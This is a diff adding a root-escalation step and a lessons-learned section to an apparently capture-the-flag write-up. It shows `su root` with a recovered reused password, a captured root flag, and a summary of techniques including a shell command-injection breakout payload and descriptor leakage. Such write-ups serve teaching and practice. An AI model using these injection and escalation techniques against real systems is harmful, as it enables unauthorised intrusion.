@@ -888,7 +888,7 @@ else: conn.sendall(SHA256("SYSTEM_CLEAN:"+secret)) # only a hash
 <br>
 </div>
 
-#### 5.3 Leak root's file descriptor and recover the admin password
+### 5.3 Leak root's file descriptor and recover the admin password
 
 **Why this step:** The daemon leaks root's open descriptor for `admin_pins.conf` when its log contains a trigger word. Planting the trigger and receiving the descriptor yields the protected password.
 
@@ -946,6 +946,47 @@ msg: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
 <br>
 </div>
 
+### 5.4 Escalate to root via password reuse
+
+**Why this step:** The descriptor leak yielded the admin password. The machine reuses that password for the root account, so switching user completes the escalation.
+
+**Command (on target, as `archivist`):**
+
+```bash
+su root
+# password: ApparelMortuaryCedar22
+id
+cat /root/root.txt
+```
+
+**Breakdown:**
+
+- `su root`: switch to the root account, authenticating with the recovered password.
+- `id`: confirm the effective user is `uid=0(root)`.
+- `cat /root/root.txt`: read the root flag, accessible only to root.
+
+**Result:**
+
+```
+root@paperwork:/home/archivist# id
+uid=0(root) gid=0(root) groups=0(root)
+root@paperwork:/home/archivist# cat /root/root.txt
+22f63ca836790a4b96c42fd724fd22fb
+```
+
+**What this gives you:**
+
+- Key finding: the admin password from `admin_pins.conf` is reused as the root password, so `su` grants a full root shell.
+- Root access confirmed (`uid=0`) and `root.txt` captured.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
 
 <div align="center">
 <br>
@@ -957,6 +998,14 @@ msg: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
 <div style="page-break-after: always;"></div>
 
 ## 6. Lessons Learned
+
+1. `x in y` on Python strings is a substring test, not equality. Any validation written that way is bypassable, and an empty string passes every such check.
+2. `subprocess.Popen(f"...{user_input}...", shell=True)` is command injection whenever the input is attacker-controlled. Single-quote context is broken out of with `'; <cmd>; #`.
+3. Services bound to `127.0.0.1` are invisible to external scans but fully reachable after a foothold. Always enumerate internal listeners (`ss -tlnp`) once you land.
+4. A file-read traversal primitive is usually also a file-write primitive. `FSUPLOAD` to read, `FSDOWNLOAD` to write, and writing an SSH key is the fastest route to a stable shell.
+5. `SCM_RIGHTS` passes an open file descriptor, and permission is checked at `open()` time, not at read time. A root process that passes you a descriptor passes you its access, no matter your own rights on the file.
+6. When a dangerous code path is gated by a file an attacker can modify, the attacker controls the gate. Here a log file in `archivist`'s home decided whether root leaked a secret.
+7. Password reuse collapses privilege boundaries. A secret recovered from one context (an "admin PIN" config) was the root account password verbatim.
 <div align="center">
 <br>
 <br>
